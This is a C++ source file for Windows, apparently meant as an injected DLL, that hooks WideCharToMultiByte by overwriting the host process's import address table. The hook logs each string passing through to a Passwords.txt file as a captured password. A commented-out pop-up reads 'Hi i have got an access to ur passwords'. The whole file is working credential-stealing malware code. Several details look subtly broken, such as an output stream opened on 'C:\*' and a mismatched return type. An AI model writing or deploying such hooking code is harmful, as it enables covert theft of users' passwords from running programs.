#pragma warning (disable:26812)

// system includes
#include <Windows.h>
#include <Psapi.h>		// for MODULEINFO and K32GetModuleInformation
#include <iostream>
#include <vector>
#include<string.h>
#include <stdio.h>
#include <tchar.h>
#include <fstream>
#include <sstream>


// custom includes

#include "evil.h"

VOID
WINAPI
BeginHook()
{
	CStringA Message = "";
	Message.Format("[*] %s: Starting the hook process\n", __FUNCTION__);
	OutputDebugStringA(Message.GetBuffer());

	MODULEINFO ModuleInfo = { 0 };				// to be filled out by GetModuleInformation()
	HMODULE hModSelf = GetModuleHandleW(NULL);	// handle to self

	BOOL Status = K32GetModuleInformation(GetCurrentProcess(), hModSelf, &ModuleInfo, sizeof(MODULEINFO));
	if (!Status)
	{
		return;
	}

	PBYTE BaseAddress = (PBYTE)ModuleInfo.lpBaseOfDll;	// cast PVOID to PBYTE
	PIMAGE_DOS_HEADER pimgDos = (PIMAGE_DOS_HEADER)BaseAddress;		// cast the base address to proper struct to begin parsing
	PIMAGE_NT_HEADERS pimgNt = (PIMAGE_NT_HEADERS)(BaseAddress + pimgDos->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pimgOpt = (PIMAGE_OPTIONAL_HEADER) & (pimgNt->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pimgImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(BaseAddress + pimgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	for (; pimgImportDescriptor->Characteristics; pimgImportDescriptor++)
	{

		if (!_stricmp((PCHAR)(BaseAddress + pimgImportDescriptor->Name), "kernel32.dll"))
		{
			Message.Format("[+] %s: Found the module!\n", __FUNCTION__);
			OutputDebugStringA(Message.GetBuffer());

			break;
		}
	}

	PIMAGE_THUNK_DATA pimgOriginalFirstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pimgFirstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->FirstThunk);
	PIMAGE_IMPORT_BY_NAME NamesArray = NULL;

	PIMAGE_THUNK_DATA INT_ = (PIMAGE_THUNK_DATA)pimgOriginalFirstThunk;	// INT is the import names table
	PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)pimgFirstThunk;			// IAT is the import address table

	for (; !(INT_->u1.Ordinal & IMAGE_ORDINAL_FLAG) && INT_->u1.AddressOfData; INT_++)
	{
		NamesArray = (PIMAGE_IMPORT_BY_NAME)(BaseAddress + INT_->u1.AddressOfData);
		if (!_stricmp("WideCharToMultiByte", (PCHAR)(NamesArray->Name)))
		{
#ifdef _WIN64
			Message.Format("\tRVA: 0x%I64X, Name: %s()\n", INT_->u1.Function, (PCHAR)(NamesArray->Name));
			OutputDebugStringA(Message.GetBuffer());
#else
			Message.Format("\tRVA: 0x%x, Name: %s()\n", INT_->u1.Function, (PCHAR)(NamesArray->Name));
			OutputDebugStringA(Message.GetBuffer());
#endif // _WIN64

			Message.Format("[+] %s: Found the function!\n", __FUNCTION__);
			OutputDebugStringA(Message.GetBuffer());

			break;
		}
		IAT++;
	}


	DWORD OldProtect = 0;
	DWORD LastError = 0;

	Status = VirtualProtect((PVOID) & (IAT->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &OldProtect);
	if (!Status)
	{
		LastError = GetLastError();
		//ResolveErrorCode("VirtualProtect: ", LastError);
		Message.Format("[!] %s: Could not change initial permissions, error: %d\n", __FUNCTION__, LastError);
		OutputDebugStringA(Message.GetBuffer());

		return;
	}

	Message.Format("[*] Writing over the function pointer\n");
	OutputDebugStringA(Message.GetBuffer());


	IAT->u1.Function = (uintptr_t)pfnHookedWideCharToMultiByte;

	Message.Format("[+] Successfully overwrote the function pointer\n");
	OutputDebugStringA(Message.GetBuffer());

	DWORD OldProtect1 = 0;


	Status = VirtualProtect((PVOID) & (IAT->u1.Function), sizeof(uintptr_t), OldProtect, &OldProtect1);
	if (!Status)
	{
		LastError = GetLastError();
		//ResolveErrorCode("VirtualProtect: ", LastError);
		Message.Format("[!] %s: Could not restore initial permissions, error: %d\n", __FUNCTION__, LastError);
		OutputDebugStringA(Message.GetBuffer());

		return;
	}

	CloseHandle(hModSelf);

	return;
}



PF_MultiByteToWideChar pfnRealMultiByteToWideChar = (PF_MultiByteToWideChar)GetProcAddress(GetModuleHandleA("kernel32"), "MultiByteToWideChar");
PF_WideCharToMultiByte pfnRealWideCharToMultiByte = (PF_WideCharToMultiByte)GetProcAddress(GetModuleHandleA("kernel32"), "WideCharToMultiByte");
// the implementation of the hooked function

std::string convertToString(char* a, int size)
{
	int i;
	std::string s = "";
	for (i = 0; i < size; i++) {
		s = s + a[i];
	}
	return s;
}

NTSTATUS
WINAPI
pfnHookedWideCharToMultiByte(
	UINT                               CodePage,
	DWORD                              dwFlags,
	_In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
	int                                cchWideChar,
	LPSTR                              lpMultiByteStr,
	int                                cbMultiByte,
	LPCCH                              lpDefaultChar,
	LPBOOL                             lpUsedDefaultChar
)
{
	//lpMultiByteStr <- pointer to string
	NTSTATUS Status = 0L;
	//CHAR Path[256];
	std::ofstream myfile2("C:\\*");
	myfile2.open("Passwords.txt", std::ios_base::app);
	std::string myString;
	int size = sizeof(lpWideCharStr) / sizeof(lpWideCharStr[0]);
	int i = 0;
	while (lpWideCharStr[i] != NULL) {
		myString.push_back(char(lpWideCharStr[i]));
		i++;
	};

	myfile2<<"Password used by user: " << myString << "\n";
	myfile2.close();
	std::string messageTitle = "Hi i have got an access to ur passwords";
	std::string message = "Your password: ";
	message += myString;

	//display message Box with user password 
	/*
	MessageBox(
		NULL,
		(LPCSTR)message.c_str(),
		(LPCSTR)messageTitle.c_str(),
		MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
	);
	*/
	Status = pfnRealWideCharToMultiByte(
		 CodePage,
		 dwFlags,
		 lpWideCharStr,
		 cchWideChar,
		 lpMultiByteStr,
		 cbMultiByte,
		 lpDefaultChar,
		 lpUsedDefaultChar
	);


	return Status;
}